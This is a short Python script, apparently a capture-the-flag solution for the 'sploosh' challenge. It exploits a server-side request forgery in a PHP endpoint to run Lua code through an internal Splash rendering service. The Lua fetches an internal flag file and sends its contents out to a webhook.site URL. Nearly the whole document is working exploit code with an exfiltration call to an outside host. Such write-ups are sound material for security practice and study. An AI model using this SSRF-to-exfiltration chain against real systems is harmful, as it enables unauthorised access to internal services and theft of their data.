# Original
# https://gist.github.com/u0pattern/92c01201e4f6b7139ba7e72c734afb1f

import requests
from urllib.parse import quote

lua="""
function main(splash)
    local treat = require("treat")
    local json = splash:http_get('http://172.16.0.14/flag.php')
    local response=splash:http_get('https://webhook.site/25760c6e-5ef1-42f7-b8e1-bae8e3abbf4b?flag='.. treat.as_string(json.body))
end         
"""
 
url='http://sploosh.chal.perfect.blue/api.php?url=http://splash:8050/execute?lua_source='+quote(lua)
response=requests.get(url)
print(response.text)